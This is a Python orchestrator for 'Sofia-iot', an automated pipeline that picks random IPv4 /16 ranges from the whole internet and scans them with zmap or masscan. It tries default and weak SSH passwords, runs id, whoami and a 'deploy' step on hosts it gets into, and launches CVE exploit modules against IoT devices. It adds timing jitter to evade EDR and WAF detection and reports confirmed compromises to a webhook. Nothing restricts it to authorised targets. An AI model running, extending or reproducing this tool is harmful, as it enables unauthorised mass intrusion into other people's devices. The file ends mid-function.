# -*- coding: utf-8 -*-
"""
Sofia-iot — Orchestrator: điều phối pipeline 5 giai đoạn.

  Giai đoạn 0 — Discovery   : target_generator.generate() (zmap/masscan)
                              — hoặc đọc file targets.txt khi --no-discover.
                              NÂNG CẤP: khi SCAN_RANGES trống + AUTO_GEN_RANGES,
                              pipeline TỰ ĐỘNG SINH dải IPv4 /16 từ AUTO_GEN_CIDR
                              (mặc định 0.0.0.0/0 → 65536 dải /16, xáo thứ tự
                              theo seed), quét từng BATCH rồi ghi checkpoint.
  Giai đoạn 1 — Fingerprint : scanner.fingerprint() trên từng (IP, cổng mở),
                              hợp nhất với PORT_CVE_MAP theo cổng → danh sách CVE.
  Giai đoạn 2 — Exploit     : (2a) thử credential SSH mặc định/yếu (cổng 22,
                              exploits.ssh_creds) TRƯỚC khi chạy CVE SSH; đăng nhập
                              được → finding SSH-DEFAULT-CREDS CONFIRMED + exec
                              id/whoami/deploy, và bỏ job CVE SSH của host đó nếu
                              SSH_CREDS_SKIP_CVE_ON_SUCCESS.
                              (2b) gọi module tương ứng trong exploits.REGISTRY
                              cho từng (host, cve); chọn cổng phù hợp; ưu tiên
                              CVE SSH (cổng 22) lên đầu khi SSH_PRIORITY_FIRST.
  Giai đoạn 3 — Verify      : verifier.verify() xác nhận RCE (marker/'uid='
                              hoặc blind-check qua webroot).
  Giai đoạn 4 — Report      : ghi kết quả vào results/ + gửi webhook (finding,
                              tiến độ batch, summary).

Cách chạy (nâng cấp mới):
    python3 main.py --max-chunks 8 --batch 2        # tự sinh 8 dải /16, quét 2 dải/batch
    python3 main.py                                   # engine zmap (mặc định): dải /16 ngẫu nhiên → zmap_scan.txt
    python3 main.py --max-chunks 8 --batch 2          # (RANDOM_RANGE_MODE=False) tự sinh 8 dải /16 thật
    python3 main.py --engines zmap                    # engine zmap: tự sinh /16 ngẫu nhiên, quét cổng bằng zmap
    python3 main.py --engines masscan                 # engine masscan: tự sinh /16 ngẫu nhiên, quét cổng bằng masscan
    python3 main.py --no-resume                       # quét lại từ đầu
    python3 main.py --retry-failed                    # quét lại các dải lỗi
    python3 main.py --gen-cidr 203.0.113.0/16 --split-to 24   # chia dải nhỏ hơn để test
    python3 main.py --scan-range 192.0.2.0/24 --batch 1       # dải khai tay (vẫn có checkpoint)
    python3 main.py --no-discover --targets lab.txt --limit 50   # chế độ cũ: đọc targets.txt
    python3 main.py --webhook https://hook.example.com/x --notify-all

Engine "zmap" (mặc định): KHÔNG dùng masscan. Tự sinh 1 dải IPv4 /16 NGẪU
NHIÊN rồi dùng zmap quét TẤT CẢ SCAN_PORTS; kết quả "IP:Port" → zmap_scan.txt.
Engine "masscan": cũng tự sinh 1 dải IPv4 /16 NGẪU NHIÊN rồi dùng masscan quét
SCAN_PORTS; kết quả "IP:Port" → mass_scan.txt. (CLI: --engines masscan)

Mọi kết quả được lưu dưới results/ (findings.json, scan_summary.json,
fingerprints.json, state.json — checkpoint resume theo dải /16).
"""

import argparse
import ipaddress
import json
import logging
import os
import random
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import checkpoint
import cve_selector
import target_generator
from config import (
    AUTO_GEN_CIDR,
    AUTO_GEN_MAX_CHUNKS,
    AUTO_GEN_SEED,
    AUTO_GEN_SHUFFLE,
    AUTO_GEN_SPLIT_TO,
    BATCH_SIZE,
    CVE_SELECT_DROP_MISMATCH,
    CVE_SELECT_ENABLED,
    CVE_SELECT_MIN_SCORE,
    DISCOVER_MODE,
    EXPLOIT_JITTER,
    EXPLOIT_PER_HOST_LIMIT,
    FINGERPRINT_WORKERS,
    FP_PER_HOST_LIMIT,
    INTERNET_WIDE_HOSTS,
    MAX_CVES_PER_HOST,
    MAX_TARGETS,
    NOTIFY_PROGRESS,
    POLITENESS_SLEEP_MAX,
    POLITENESS_SLEEP_MIN,
    RANDOM_RANGE_MODE,
    RANDOM_RANGE_PREFIX,
    RANDOM_RANGE_SEED,
    RESULTS_DIR,
    STATE_FILE,
    THREADS,
    TIMEOUT,
    # ── Chống block khi quét dải lớn (rate_limiter) ────────────────────
    SCAN_RATE_START,
    SCAN_RATE_MIN,
    SCAN_RATE_MAX,
    SCAN_BLOCK_ZERO_BATCHES,
    SCAN_BLOCK_BACKOFF_MIN,
    SCAN_BLOCK_BACKOFF_MAX,
    SCAN_PORT_JITTER,
    # ── SSH (cổng 22): thử mật khẩu mặc định/yếu trước CVE SSH ─────────
    SSH_CREDS_ENABLED,
    SSH_CREDS_SKIP_CVE_ON_SUCCESS,
    SSH_CREDS_TIMEOUT,
    SSH_CREDS_WORKERS,
    SSH_PRIORITY_FIRST,
)
from exploits import REGISTRY
from exploits import ssh_creds
from scanner import fingerprint, retry_call, tcp_connect
from target_generator import PORT_CVE_MAP
import rate_limiter
import report
import verifier
import webhook

log = logging.getLogger("sofia.main")

DEFAULT_TARGETS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "targets.txt")


# ── Giai đoạn 0: nạp mục tiêu ───────────────────────────────────────────
def load_targets_file(path):
    """
    Đọc targets.txt → dict {ip: {"ports": [...], "cves": [...]}}.
    Cú pháp mỗi dòng:
      "IP"                  → cổng 80
      "IP:PORT"             → cổng chỉ định
      "IP:PORT:cve1,cve2"   → cổng + CVE gắn sẵn (lab: thiết bị giả lập
                              không có đủ dấu hiệu fingerprint)
      "CIDR"                → mở rộng thành từng IP (chỉ dải nhỏ)
    Dòng '#' là chú thích.
    """
    import ipaddress

    out = {}
    with open(path, encoding="utf-8") as fh:
        for raw in fh:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            try:
                if "/" in line:
                    net = ipaddress.ip_network(line, strict=False)
                    for ip in net.hosts():
                        out.setdefault(str(ip), {"ports": [80], "cves": []})
                    continue
                ip, sep, rest = line.partition(":")
                port = 80
                cves = []
                if sep:
                    port_s, _, cve_s = rest.partition(":")
                    port = int(port_s) if port_s else 80
                    cves = [c.strip() for c in cve_s.split(",") if c.strip()]
                entry = out.setdefault(ip, {"ports": [], "cves": set()})
                entry["ports"].append(port)
                entry["cves"].update(cves)
            except ValueError as exc:
                log.warning("Bỏ qua dòng targets không hợp lệ %r: %s", line, exc)
    # "port_cves" để trống: file targets.txt chỉ khai CVE tường minh (lab override),
    # còn CVE suy ra từ cổng do stage 0 (target_generator) tính riêng.
    out = {ip: {"ports": meta["ports"], "cves": sorted(meta["cves"]),
                "port_cves": []}
           for ip, meta in out.items()}
    log.info("Đã nạp %d mục tiêu từ %s", len(out), path)
    return out


# ── Giai đoạn 1: fingerprint → danh sách (host, port, cve) ──────────────
# Tên server header "generic" — host chỉ có tín hiệu server loại này (Apache/Nginx/
# IIS/httpd/Jetty) KHÔNG được gán CVE-by-port (PORT_CVE_MAP) để tránh bắn ~15 CVE
# không bằng chứng vào bất kỳ web server thường nào (dương giả hàng loạt).
_GENERIC_SERVER_NAMES = {"apache", "nginx", "iis", "httpd", "jetty"}


def _is_generic_webserver(info):
    """
    Generic webserver = TẤT CẢ tín hiệu fingerprint đều là `server:*` với tên
    trong _GENERIC_SERVER_NAMES. Danh sách signals rỗng → False (giữ hành vi
    chống bỏ sót cũ: fingerprint trống vẫn quét CVE-by-port).
    """
    signals = [s for s in (info.get("signals") or []) if s]
    if not signals:
        return False
    for s in signals:
        if not s.startswith("server:"):
            return False
        name = s.split(":", 1)[1].strip().lower()
        if name not in _GENERIC_SERVER_NAMES:
            return False
    return True


def _select_cves(candidates, info, port, explicit_cves):
    """
    Chọn CVE cho (host, port) bằng engine chọn thông minh (cve_selector) dựa
    trên BẰNG CHỨNG fingerprint (vendor/platform/ssh markers, versions):
      * loại CVE có version NGOÀI khoảng đã fingerprint (trừ CVE khai tay);
      * loại CVE lệch vendor rõ ràng khi CVE_SELECT_DROP_MISMATCH;
      * loại CVE điểm < CVE_SELECT_MIN_SCORE;
      * CVE khai tay (explicit) LUÔN giữ.
    Trả về list CVE đã sắp theo điểm khả dụng (giảm dần). Bật/tắt qua
    CVE_SELECT_ENABLED; mặc định (tắt) trả nguyên candidates như hành vi cũ.
    """
    cand = sorted(c for c in candidates if c)
    if not cand or not CVE_SELECT_ENABLED:
        return cand
    try:
        kept, suppressed = cve_selector.select(
            cand, info, port, max_per_host=0,
            min_score=CVE_SELECT_MIN_SCORE, registry=REGISTRY,
            explicit_cves=explicit_cves, drop_fingerprint_only=False,
            drop_mismatch=CVE_SELECT_DROP_MISMATCH)
        if suppressed:
            log.debug("cve_selector %s:%s loại %d/%d: %s",
                      info.get("host", "?"), port, len(suppressed), len(cand),
                      "; ".join("%s(%s)" % (s["cve"], s.get("suppress_reason"))
                                for s in suppressed[:6]))
        return [it["cve"] for it in kept]
    except Exception as exc:  # noqa: BLE001 — selector lỗi không được vỡ pipeline
        log.debug("cve_selector fallback (%r)", exc)
        return cand


def stage1_fingerprint(targets, timeout=TIMEOUT):
    """
    Với mỗi IP: re-check cổng, chạy fingerprint để lấy candidates,
    hợp nhất với danh sách CVE theo cổng (PORT_CVE_MAP từ stage 0).

    SONG SONG HÓA (P0.4 UPGRADE_PROPOSAL): thay vòng `for ip` tuần tự bằng
    ThreadPoolExecutor FINGERPRINT_WORKERS worker; mỗi HOST giới hạn
    FP_PER_HOST_LIMIT task đồng thời (BoundedSemaphore) để không làm nghẽn
    thiết bị yếu khi host mở nhiều cổng. Kết quả gộp LẠI THEO THỨ TỰ GỐC
    (không đổi so với chạy tuần tự) → report/repro giữ ổn định.

    GATING: host fingerprint chỉ ra generic web server (apache/nginx/iis/httpd/jetty)
    sẽ KHÔNG được gán CVE-by-port — chỉ giữ candidates từ fingerprint thật và CVE
    gán sẵn trong targets.txt (lab override). Fingerprint trống/không xác định vẫn
    giữ CVE-by-port (chống bỏ sót). Kết quả gating ghi vào info["port_cve_gated"].

    Trả về (jobs, fingerprints):
      jobs        — list (host, port, cve_id) duy nhất theo (host, cve)
      fingerprints— list dict kết quả fingerprint (để ghi report)
    """
    jobs = {}            # (host, cve) -> (port, thông tin fingerprint)
    fingerprints = []

    # 1) Dựng danh sách task (ip, port) theo thứ tự ổn định như chạy tuần tự.
    tasks = []
    for ip, meta in targets.items():
        for port in sorted(set(meta.get("ports") or [80])):
            tasks.append((ip, port))

    # 2) Chạy tcp_connect + fingerprint song song; kết quả giữ nguyên vị trí.
    fp_results = [None] * len(tasks)
    per_host = {}          # semaphore riêng từng host

    def _fp_worker(idx):
        ip, port = tasks[idx]
        sem = per_host.setdefault(ip, threading.BoundedSemaphore(FP_PER_HOST_LIMIT))
        with sem:
            try:
                if not tcp_connect(ip, port, timeout=3):
                    return
                info = fingerprint(ip, port, timeout)
                info["candidates"] = sorted(info["candidates"])   # set → list cho JSON
                fp_results[idx] = (ip, port, info)
            except Exception as exc:
                log.debug("fingerprint %s:%d lỗi: %r", ip, port, exc)

    if tasks:
        with ThreadPoolExecutor(max_workers=FINGERPRINT_WORKERS) as pool:
            list(pool.map(_fp_worker, range(len(tasks))))

    # 3) Gộp kết quả theo thứ tự gốc (không phụ thuộc thứ tự hoàn thành).
    by_host = {}           # ip -> {port: info}
    for ip, port, info in (r for r in fp_results if r):
        by_host.setdefault(ip, {})[port] = info

    for ip, meta in targets.items():
        ports = meta.get("ports") or [80]
        # CVE khai tay (lab override) — LUÔN giữ, không bị gating.
        explicit_cves = set(meta.get("cves") or [])
        # CVE suy ra từ cổng (stage 0) — có thể bị gating với generic webserver.
        declared = meta.get("port_cves")
        if declared is None:            # tương thích dạng cũ: chỉ có "cves"
            declared = set(meta.get("cves") or [])
            explicit_cves = set()
        else:
            declared = set(declared)
        found_any = False
        for port in sorted(set(ports)):
            info = by_host.get(ip, {}).get(port)
            if info is None:
                continue
            found_any = True
            fingerprints.append(info)
            # GATING: host generic-http (chỉ có tín hiệu server:apache/nginx/...)
            # không gán CVE-by-port — chống bắn CVE hàng loạt vào web server thường.
            generic = _is_generic_webserver(info)
            info["port_cve_gated"] = generic
            if generic:
                port_cves = set()
                log.debug("Gating %s:%d — generic webserver (%s), bỏ CVE-by-port %s",
                          ip, port, ",".join(info["signals"]),
                          sorted(declared or PORT_CVE_MAP.get(port, [])))
            elif declared:
                # Dùng CVE đã chọn ở stage 0 (tôn trọng --only-cves/--max-cves-per-host).
                port_cves = declared
            else:
                # Dạng cũ (targets.txt / targets không có "port_cves") → map theo cổng.
                port_cves = set(PORT_CVE_MAP.get(port, []))
            # Chống bỏ sót: candidates từ fingerprint + CVE gắn sẵn (targets.txt
            # vẫn là lab override) + CVE theo cổng (trừ generic webserver).
            candidates = (set(info["candidates"])
                          | explicit_cves
                          | port_cves)
            candidates = {c for c in candidates if c in REGISTRY}
            # ENGINE CHỌN THÔNG MINH: chấm điểm theo bằng chứng fingerprint
            # (version/vendor marker) → loại CVE lệch khoảng/lệch vendor/điểm thấp;
            # CVE khai tay luôn giữ. Fallback nguyên candidates khi tắt/lỗi.
            candidates = _select_cves(candidates, info, port, explicit_cves)
            for cve in candidates:
                jobs.setdefault((ip, cve), (port, info))
        if not found_any:
            log.debug("Bỏ qua %s: không cổng nào mở trong danh sách %s", ip, sorted(set(ports)))

    log.info("Giai đoạn 1 xong: %d fingerprint, %d (host, CVE) ứng viên khai thác",
             len(fingerprints), len(jobs))
    return jobs, fingerprints


# ── Giai đoạn 2+3: chọn cổng + khai thác + xác minh ─────────────────────
class _PortProbeCache:
    """Cache kết quả dò cổng (tcp_connect) trong 1 lần chạy Giai đoạn 2.

    Nhiều CVE trên cùng một thiết bị thường dò lại CÙNG (host, port); cache
    thread-safe + gộp các lần dò trùng (single-flight) giúp giảm mạnh số
    round-trip và độ trễ khi resolve cổng cho lượng lớn (host, cve).
    """

    def __init__(self):
        self._lock = threading.Lock()
        self._done = {}          # (host, port) -> bool
        self._inflight = {}      # (host, port) -> threading.Event

    def connect(self, host, port, timeout=3):
        """Trả về True/False; chỉ thực sự tcp_connect 1 lần cho mỗi (host, port)."""
        key = (host, port)
        with self._lock:
            if key in self._done:
                return self._done[key]
            ev = self._inflight.get(key)
            leader = ev is None
            if leader:
                ev = threading.Event()
                self._inflight[key] = ev
        if not leader:
            # Thread khác đang dò cùng cổng → chờ rồi dùng lại kết quả (khỏi dò lại).
            ev.wait(timeout + 1)
            with self._lock:
                return self._done.get(key, False)
        try:
            ok = bool(retry_call(tcp_connect, host, port, timeout=timeout)[0])
        except Exception as exc:                 # phòng hờ: không làm chết task
            log.debug("Dò cổng %s:%d lỗi: %r", host, port, exc)
            ok = False
        with self._lock:
            self._done[key] = ok
            self._inflight.pop(key, None)
            ev.set()
        return ok


def resolve_port(host, cve_id, discovered_info, timeout=TIMEOUT, probe=None):
    """
    Chọn cổng khai thác cho (host, cve):
      1. CVE fingerprint_only → dùng luôn cổng đã phát hiện (không gửi traffic).
      2. Cổng đã phát hiện mở nằm trong danh sách ports của CVE → dùng luôn
         (stage1 đã xác nhận cổng này MỞ, không cần dò lại).
      3. Nếu không: thử từng cổng mặc định của CVE (qua cache dò cổng).
      4. Cuối cùng: chính cổng đã phát hiện (cache) — hỗ trợ lab test trên cổng
         không chuẩn; verifier tự loại trừ dương giả bằng marker.
    Trả về port hoặc None (không cổng nào khả dụng → bỏ qua).
    """
    info = REGISTRY[cve_id]
    disc_port, _ = discovered_info
    if info.get("fingerprint_only"):
        return disc_port
    if disc_port in info["ports"]:
        return disc_port

    def _open(p):
        if probe is not None:
            return probe.connect(host, p, timeout=3)
        return bool(retry_call(tcp_connect, host, p, timeout=3)[0])   # retry chống flaky

    for p in info["ports"]:
        if _open(p):
            return p
    if _open(disc_port):
        return disc_port
    return None


# ── Giai đoạn 2a: thử credential SSH mặc định/yếu TRƯỚC CVE SSH ─────────
def _is_ssh_cve(cve_id, port=None):
    """True nếu CVE thuộc cụm SSH (REGISTRY ports chứa 22) hoặc port == 22."""
    info = REGISTRY.get(cve_id) or {}
    if 22 in (info.get("ports") or []):
        return True
    try:
        return int(port) == 22
    except (TypeError, ValueError):
        return False


def _ssh_candidate_hosts(jobs, fingerprints):
    """
    Tập host cần thử credential SSH (cổng 22):
      * host có fingerprint trên cổng 22, HOẶC
      * host có job CVE thuộc cụm SSH (REGISTRY ports == [22]).
    Trả set[str] (đã loại phần tử rỗng).
    """
    hosts = set()
    for fp in fingerprints or []:
        try:
            if int((fp or {}).get("port")) == 22:
                hosts.add((fp or {}).get("host"))
        except (TypeError, ValueError):
            continue
    for (host, cve) in list(jobs.keys()):
        if _is_ssh_cve(cve):
            hosts.add(host)
    hosts.discard(None)
    hosts.discard("")
    return hosts


def _ssh_info_for_host(jobs, fingerprints, host):
    """Thông tin fingerprint/server cho `host` (ưu tiên cổng 22) — để điền finding."""
    for fp in fingerprints or []:
        if (fp or {}).get("host") == host:
            try:
                if int((fp or {}).get("port")) == 22:
                    return fp
            except (TypeError, ValueError):
                continue
    for (h, _cve), (_port, info) in list(jobs.items()):
        if h == host and isinstance(info, dict):
            return info
    return {}


def _ssh_creds_finding(host, res, info):
    """Dựng finding chuẩn pipeline cho 1 đăng nhập SSH thành công (CONFIRMED)."""
    info = info or {}
    return {
        "cve": ssh_creds.CVE_ID,
        "host": host,
        "port": 22,
        "status": verifier.CONFIRMED,
        "evidence": res.get("evidence", ""),
        "name": ssh_creds.NAME,
        "device": info.get("device", "Unknown"),
        "server": info.get("server", ""),
        "title": info.get("title", ""),
        "port_used": 22,
        "waf": info.get("waf", ""),
        # ── bằng chứng credential + exec (id/whoami/deploy) ──
        "username": res.get("username"),
        "password": res.get("password"),
        "id_output": res.get("id_output", ""),
        "whoami": res.get("whoami", ""),
        "deploy": res.get("deploy", {}),
        "server_ident": res.get("server_ident", ""),
        "hostkey_sha256": res.get("hostkey_sha256", ""),
        "attempts": res.get("attempts", 0),
    }


def run_ssh_creds_stage(jobs, fingerprints, timeout=None):
    """
    Giai đoạn 2a — thử credential SSH mặc định/yếu trên mọi host mở cổng 22
    TRƯỚC khi chạy CVE SSH (regreSSHion/libssh/Terrapin...).

    Đăng nhập THÀNH CÔNG → finding status CONFIRMED (deterministic, bằng chứng
    credential + `id`/`whoami` + deploy) và host được nạp vào `ok_hosts`.
    Đăng nhập THẤT BẠI → không thêm gì; pipeline tiếp tục sang CVE SSH như cũ.

    Trả (list finding, set host đăng nhập được). Không bao giờ raise.
    """
    cred_findings = []
    ok_hosts = set()
    if not SSH_CREDS_ENABLED:
        return cred_findings, ok_hosts

    hosts = _ssh_candidate_hosts(jobs, fingerprints)
    if not hosts:
        return cred_findings, ok_hosts

    if timeout is None:
        timeout = SSH_CREDS_TIMEOUT
    log.info("Giai đoạn 2a — thử credential SSH cổng 22 trên %d host...", len(hosts))

    def _work(host):
        try:
            return host, ssh_creds.run(host, 22, timeout=timeout)
        except Exception as exc:            # ssh_creds.run không raise, nhưng phòng hờ
            return host, {"ok": False, "error": repr(exc)[:200]}

    with ThreadPoolExecutor(max_workers=max(1, int(SSH_CREDS_WORKERS or 1))) as pool:
        futures = [pool.submit(_work, h) for h in sorted(hosts)]
        for fut in as_completed(futures):
            try:
                host, res = fut.result()
            except Exception as exc:
                log.warning("Lỗi không mong đợi bước cred SSH: %r", exc)
                continue
            if not res.get("ok"):
                log.debug("SSH cred %s: %s", host, res.get("error", "thất bại"))
                continue
            info = _ssh_info_for_host(jobs, fingerprints, host)
            cred_findings.append(_ssh_creds_finding(host, res, info))
            ok_hosts.add(host)
            log.warning("[%s] %s:22 → CONFIRMED user=%s (thử #%s/%s)",
                        ssh_creds.CVE_ID, host, res.get("username"),
                        res.get("attempts"), "?")

    if ok_hosts:
        log.info("Giai đoạn 2a xong: %d/%d host đăng nhập được bằng credential mặc định/yếu",
                 len(ok_hosts), len(hosts))
    return cred_findings, ok_hosts


def run_exploits(jobs, timeout=TIMEOUT, max_workers=THREADS):
    """
    Chạy (host, cve) song song: resolve cổng → verifier.verify().

    Rate-limit P0 — 0.2: nhiều host chạy song song (THREADS worker) nhưng mỗi
    HOST chỉ có tối đa EXPLOIT_PER_HOST_LIMIT task exploit/verify đồng thời
    (BoundedSemaphore) — không để 50 threads dồn toàn bộ CVE vào 1 thiết bị.
    Thêm jitter ngẫu nhiên trước mỗi probe để tránh burst đều nhịp dễ bị
    phát hiện (EDR/WAF theo pattern). Trả về list findings (dict JSON-serializable).
    """
    findings = []
    per_host_sem = {}
    sem_lock = threading.Lock()
    probe = _PortProbeCache()

    def _get_host_sem(host):
        """BoundedSemaphore riêng từng host (double-checked locking, thread-safe)."""
        sem = per_host_sem.get(host)
        if sem is None:
            with sem_lock:
                sem = per_host_sem.get(host)
                if sem is None:
                    sem = threading.BoundedSemaphore(EXPLOIT_PER_HOST_LIMIT)
                    per_host_sem[host] = sem
        return sem

    def _work(host, cve, discovered):
        """1 task Giai đoạn 2 (chạy TRONG worker): giới hạn theo host →
        chọn cổng (song song) → jitter → verifier.verify()."""
        info = discovered[1]
        with _get_host_sem(host):
            try:
                port = resolve_port(host, cve, discovered, timeout, probe)
            except Exception as exc:
                log.warning("Lỗi chọn cổng %s %s: %r", host, cve, exc)
                return {"cve": cve, "host": host, "port": discovered[0],
                        "status": "ERROR", "evidence": repr(exc)[:200]}, info
            if port is None:
                log.debug("Bỏ qua %s %s: không mở cổng khai thác", host, cve)
                return None, info
            if EXPLOIT_JITTER > 0:
                time.sleep(random.uniform(0, EXPLOIT_JITTER))
            try:
                result = verifier.verify(host, port, cve, REGISTRY[cve], timeout)
            except Exception as exc:                 # verifier không raise, nhưng phòng hờ
                log.warning("Lỗi không mong đợi %s %s: %r", host, cve, exc)
                result = {"cve": cve, "host": host, "port": port,
                          "status": "ERROR", "evidence": repr(exc)[:200]}
            return result, info

    items = list(jobs.items())
    if not items:
        return findings

    # ƯU TIÊN CỔNG 22 (SSH): khi SSH_PRIORITY_FIRST, đẩy các (host, CVE SSH)
    # lên đầu hàng đợi submit — bằng chứng credential/RCE SSH được thử sớm.
    # Sắp xếp STABLE nên không đảo thứ tự tương đối trong mỗi nhóm và KHÔNG
    # đổi mức song song (max_workers giữ nguyên).
    if SSH_PRIORITY_FIRST:
        items.sort(key=lambda it: 0 if _is_ssh_cve(it[0][1], it[1][0]) else 1)

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        # Submit TẤT CẢ task ngay; resolve cổng chạy song song trong worker
        # thay vì chặn tuần tự ở main thread (nút cổ chai chính của bản cũ).
        futures = {pool.submit(_work, host, cve, discovered): (host, cve)
                   for (host, cve), discovered in items}

        for fut in as_completed(futures):
            host, cve = futures[fut]
            try:
                result, info = fut.result()
            except Exception as exc:                     # phòng hờ tầng pool
                log.warning("Lỗi không mong đợi %s %s: %r", host, cve, exc)
                result, info = ({"cve": cve, "host": host,
                                 "status": "ERROR", "evidence": repr(exc)[:200]},
                                jobs[(host, cve)][1])
            if result is None:
                continue
            port = result.get("port", jobs[(host, cve)][0])
            result.setdefault("name", REGISTRY[cve]["name"])
            result.setdefault("device", info.get("device", "Unknown"))
            result.setdefault("server", info.get("server", ""))
            result.setdefault("title", info.get("title", ""))
            result.setdefault("port_used", port)
            # WAF từ fingerprint (nếu verifier chưa phát hiện ở response exploit)
            if not result.get("waf"):
                result["waf"] = info.get("waf", "")
            findings.append(result)
            log.info("[%s] %s:%d → %s", cve, host, port, result["status"])
    return findings


# ── Giai đoạn 4: ghi report + webhook ───────────────────────────────────
def save_results(findings, fingerprints, stats, results_dir=RESULTS_DIR, tag=""):
    """
    Ghi findings.json, scan_summary.json, fingerprints.json vào results/.
    Nếu có `tag` (vd "batch_0001") → ghi thêm bản đánh dấu batch riêng:
      results/<tag>_findings.json, results/<tag>_fingerprints.json,
      results/<tag>_summary.json — giữ lịch sử từng batch khi quét nhiều dải.
    """
    os.makedirs(results_dir, exist_ok=True)
    base = {
        "findings": "findings.json",
        "summary": "scan_summary.json",
        "fingerprints": "fingerprints.json",
    }
    if tag:
        base = {k: "%s_%s" % (tag, v) for k, v in base.items()}
    paths = {}
    for key, fname in base.items():
        paths[key] = os.path.join(results_dir, fname)

    with open(paths["findings"], "w", encoding="utf-8") as fh:
        json.dump(findings, fh, ensure_ascii=False, indent=2)
    with open(paths["summary"], "w", encoding="utf-8") as fh:
        json.dump(stats, fh, ensure_ascii=False, indent=2)
    with open(paths["fingerprints"], "w", encoding="utf-8") as fh:
        json.dump(fingerprints, fh, ensure_ascii=False, indent=2)
    log.info("Đã ghi: %s, %s, %s", paths["findings"], paths["summary"], paths["fingerprints"])
    return paths


def summarize(findings, fingerprints=None):
    """Đếm kết quả theo trạng thái → dict cho scan_summary.json + console.

    Thống kê WAF gộp từ findings + fingerprints (dedupe theo host:port) để không
    mất thông tin "máy bị WAF chặn" khi WAF chặn sạch → 0 finding.
    """
    counts = {}
    for f in findings:
        counts[f["status"]] = counts.get(f["status"], 0) + 1
    confirmed = [f for f in findings if f["status"] == verifier.RCE_CONFIRMED]
    deterministic = [f for f in findings if f["status"] == verifier.CONFIRMED]
    # Thống kê WAF: số máy nghi bị WAF chặn (không kết luận nhầm "hết lỗ hổng")
    waf_hits = {}
    waf_total = 0
    seen = set()
    for f in findings:
        name = f.get("waf") or ""
        if name:
            key = (f["host"], f["port"])
            if key not in seen:
                seen.add(key)
                waf_hits[name] = waf_hits.get(name, 0) + 1
                waf_total += 1
    for fp in fingerprints or []:
        name = fp.get("waf") or ""
        if name:
            key = (fp.get("host"), fp.get("port"))
            if key not in seen:
                seen.add(key)
                waf_hits[name] = waf_hits.get(name, 0) + 1
                waf_total += 1
    return {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "total_findings": len(findings),
        "by_status": counts,
        "waf_detected": {"total": waf_total, "by_name": waf_hits},
        "rce_confirmed": [
            {"cve": f["cve"], "host": f["host"], "port": f["port"],
             "evidence": f.get("evidence", "")}
            for f in confirmed
        ],
        # Xác nhận deterministic (không phải RCE exec) — vd: lộ credential/auth bypass
        "confirmed_deterministic": [
            {"cve": f["cve"], "host": f["host"], "port": f["port"],
             "evidence": f.get("evidence", "")}
            for f in deterministic
        ],
    }, confirmed


def print_summary(stats, confirmed):
    """In bảng tóm tắt ra console."""
    print("\n" + "=" * 60)
    print("Sofia-iot — TÓM TẮT KẾT QUẢ")
    print("=" * 60)
    by = stats["by_status"]
    if not by:
        print("Không có kết quả nào được ghi nhận.")
    else:
        for status, n in sorted(by.items(), key=lambda kv: -kv[1]):
            print("  %-18s : %d" % (status, n))
    waf = stats["waf_detected"]
    if waf["total"]:
        print("\nWAF phát hiện (%d máy):" % waf["total"])
        for name, n in sorted(waf["by_name"].items(), key=lambda kv: -kv[1]):
            print("  - %-18s : %d" % (name, n))
    if confirmed:
        print("\nRCE ĐÃ XÁC NHẬN (%d):" % len(confirmed))
        for f in confirmed:
            print("  - %s  %s:%d  %s" % (f["cve"], f["host"], f["port"], f.get("evidence", "")[:90]))
    print("=" * 60)


# ── Pipeline 1 tập mục tiêu (dùng chung cho 1 batch /16 và chế độ cũ) ──
def run_pipeline(targets, tag="", notify=True):
    """
    Chạy giai đoạn 1→4 cho 1 tập mục tiêu (1 batch dải /16 hoặc toàn bộ):
      fingerprint → exploit+verify → lưu results → gửi webhook finding + summary.
    Trả về (findings, fingerprints, stats, confirmed).
    """
    jobs, fingerprints = stage1_fingerprint(targets)

    # ── Giai đoạn 2a: thử credential SSH mặc định/yếu TRƯỚC CVE SSH ──
    # Đăng nhập được → finding CONFIRMED (credential + id/whoami + deploy).
    # Nếu SSH_CREDS_SKIP_CVE_ON_SUCCESS: bỏ job CVE SSH của host đó (vẫn chạy
    # CVE web của host). Thất bại → giữ nguyên jobs, đi tiếp sang CVE SSH.
    cred_findings, cred_hosts = run_ssh_creds_stage(jobs, fingerprints)
    if cred_hosts and SSH_CREDS_SKIP_CVE_ON_SUCCESS:
        removed = 0
        for key in list(jobs.keys()):
            host, cve = key
            if host in cred_hosts and _is_ssh_cve(cve):
                jobs.pop(key, None)
                removed += 1
        if removed:
            log.info("SSH cred thành công %d host → bỏ qua %d job CVE SSH "
                     "(SSH_CREDS_SKIP_CVE_ON_SUCCESS)", len(cred_hosts), removed)

    findings = cred_findings + run_exploits(jobs)
    stats, confirmed = summarize(findings, fingerprints)
    save_results(findings, fingerprints, stats, tag=tag)

    if notify and findings:
        sent = 0
        for f in findings:
            if webhook.notify(f) is not None:
                sent += 1
        log.info("Webhook: %d/%d finding đã gửi", sent, len(findings))
        webhook.notify_summary(stats)
    return findings, fingerprints, stats, confirmed


# ── Vòng lặp batch dải /16 (nâng cấp chính) ────────────────────────────
def politeness_sleep():
    """Ngủ ngẫu nhiên giữa 2 batch + hết cooldown anti-block (nếu đang nghi bị chặn)."""
    delay = random.uniform(POLITENESS_SLEEP_MIN, POLITENESS_SLEEP_MAX)
    try:
        remain = rate_limiter.get_controller().cooldown_remaining()
    except Exception:
        remain = 0.0
    if remain > 0:
        delay += remain
        log.warning("Anti-block: cộng thêm cooldown %.0fs vào politeness", remain)
    log.info("Politeness: ngủ %.1fs trước batch kế tiếp...", delay)
    time.sleep(delay)


def run_range_batches(ranges, gen_key, args):
    """
    Quét lần lượt từng BATCH dải /16:
      checkpoint (resume) → quét cổng (zmap/masscan) → fingerprint → exploit
      → verify → lưu results + webhook → đánh dấu xong → politeness.

    Trả về (all_findings, all_fingerprints, agg_stats, confirmed_all).
    """
    state = checkpoint.init_state(ranges, key=gen_key, path=args.state)
    done0, total = checkpoint.progress(state)
    if done0:
        log.info("Resume: %d/%d dải đã xong — bỏ qua, tiếp tục từ dải kế tiếp",
                 done0, total)
    if not checkpoint.pending_ranges(state, retry_failed=args.retry_failed):
        log.info("Không còn dải nào pending — pipeline đã hoàn tất (--no-resume để quét lại).")
        return [], [], {}, []

    batch_size = args.batch or BATCH_SIZE
